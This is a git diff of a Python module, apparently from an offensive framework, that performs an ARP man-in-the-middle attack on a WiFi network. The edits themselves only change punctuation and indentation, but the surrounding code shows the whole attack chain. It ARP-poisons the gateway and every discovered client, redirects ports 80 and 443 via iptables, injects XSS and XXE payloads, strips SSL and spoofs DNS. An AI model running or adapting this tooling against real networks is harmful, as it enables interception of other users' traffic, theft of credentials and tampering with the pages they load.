@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # Author: Andre Henrique (@mrhenrike) | Uniao Geek
-"""ARP MITM Proxy — native, zero external tools.
+"""ARP MITM Proxy - native, zero external tools.
 
 Full MITM chain on an existing WiFi connection:
   1. ARP scan to discover gateway and all live clients on the subnet
@@ -9,10 +9,10 @@ Full MITM chain on an existing WiFi connection:
   3. Enable kernel IP forwarding (sysctl net.ipv4.ip_forward=1)
   4. iptables REDIRECT: port 80 → local HTTP proxy, port 443 → SSL strip
   5. Transparent HTTP proxy:
-       - Image replacement: every img/jpeg/png URL returns a chosen image
-       - XSS injection: <script>alert('WXF em execução')</script> in HTML
-       - XXE injection in XML/SOAP request bodies
-       - Full request/response logging
+ - Image replacement: every img/jpeg/png URL returns a chosen image
+ - XSS injection: <script>alert('WXF em execução')</script> in HTML
+ - XXE injection in XML/SOAP request bodies
+ - Full request/response logging
   6. SSL stripping: rewrites https:// links in HTML to http://
   7. DNS spoof: optional redirect of any domain to attacker IP
   8. Clean up ARP tables + iptables + IP forwarding on exit
@@ -65,9 +65,9 @@ _XSS_PAYLOAD = (
     "d.style='position:fixed;top:0;left:0;width:100%;background:#c0392b;"
     "color:#fff;font:bold 16px monospace;padding:10px 20px;z-index:99999;"
     "border-bottom:3px solid #922b21;box-shadow:0 2px 8px #0005';"
-    "d.innerHTML='&#9888; WXF MITM em execução — tráfego interceptado';"
+    "d.innerHTML='&#9888; WXF MITM em execução - tráfego interceptado';"
     "document.body&&document.body.prepend(d);"
-    "alert('WXF em execução — MITM ativo em '+location.host);"
+    "alert('WXF em execução - MITM ativo em '+location.host);"
     "}</script>"
 )
 
@@ -589,17 +589,17 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 
 @requires_os(OSRequirement.LINUX_ONLY)
 class Exploit(Exploit):
-    """ARP MITM Proxy — native WiFi MITM with HTTP injection.
+    """ARP MITM Proxy - native WiFi MITM with HTTP injection.
 
     Puts this machine in MITM position on an existing WiFi network:
       1. ARP scan to discover gateway + clients
       2. ARP poison (continuous spoofed replies, no external arp-spoof binary)
       3. IP forwarding + iptables redirect port 80/443 to local proxy
       4. Transparent HTTP proxy with:
-           - Image replacement (all images → chosen PNG)
-           - XSS injection (<script>alert('WXF em execução')</script>)
-           - XXE injection into XML/SOAP bodies
-           - SSL stripping (https → http where possible)
+ - Image replacement (all images → chosen PNG)
+ - XSS injection (<script>alert('WXF em execução')</script>)
+ - XXE injection into XML/SOAP bodies
+ - SSL stripping (https → http where possible)
       5. Clean up on stop
 
     Usage:
@@ -615,7 +615,7 @@ class Exploit(Exploit):
         "name": "ARP MITM Proxy (native)",
         "description": (
             "Transparent WiFi MITM via ARP poisoning + iptables redirect. "
-            "Pure Python/Scapy — no bettercap, mitmproxy, or arpspoof. "
+            "Pure Python/Scapy - no bettercap, mitmproxy, or arpspoof. "
             "HTTP proxy injects XSS, XXE, replaces images, strips SSL. "
             "Works on any existing WiFi connection."
         ),
@@ -675,7 +675,7 @@ class Exploit(Exploit):
         iface = str(self.interface)
         ip, mac, cidr = _get_iface_info(iface)
         network = f"{'.'.join(ip.split('.')[:3])}.0/{cidr}"
-        print_status(f"ARP scan on {iface} ({ip}/{cidr}) — subnet {network}")
+        print_status(f"ARP scan on {iface} ({ip}/{cidr}) - subnet {network}")
         hosts = _arp_scan(network, iface, timeout=float(self.scan_timeout))
         gw_ip, gw_mac = _get_default_gateway(iface)
         print_success(f"Gateway: {gw_ip} ({gw_mac})")
@@ -752,7 +752,7 @@ class Exploit(Exploit):
             print_warning("No active clients found. Starting proxy + iptables anyway.")
             print_info("Will intercept traffic from THIS machine and poison any new clients via dynamic ARP monitor.")
 
-        print_success(f"Targets ({len(targets)}): {[t[0] for t in targets] or ['(none yet — monitoring)']}")
+        print_success(f"Targets ({len(targets)}): {[t[0] for t in targets] or ['(none yet - monitoring)']}")
         print_success(f"Gateway: {gw_ip} ({gw_mac})")
         print_info(f"Proxy ports: HTTP={proxy_p} SSL={ssl_p}")
         print_info(f"Injections: XSS={_INJECT_XSS} XXE={_INJECT_XXE} IMG={_REPLACE_IMAGES} SSLSTRIP={_SSL_STRIP}")
@@ -781,7 +781,7 @@ class Exploit(Exploit):
                         known.add(h_ip)
                         with _REQUEST_LOCK:
                             poisoner._targets.append((h_ip, h_mac))
-                        print_success(f"  [+] New client detected: {h_ip} ({h_mac}) — added to ARP poison list")
+                        print_success(f"  [+] New client detected: {h_ip} ({h_mac}) - added to ARP poison list")
                 _stop_monitor.wait(15)
 
         _stop_monitor = threading.Event()
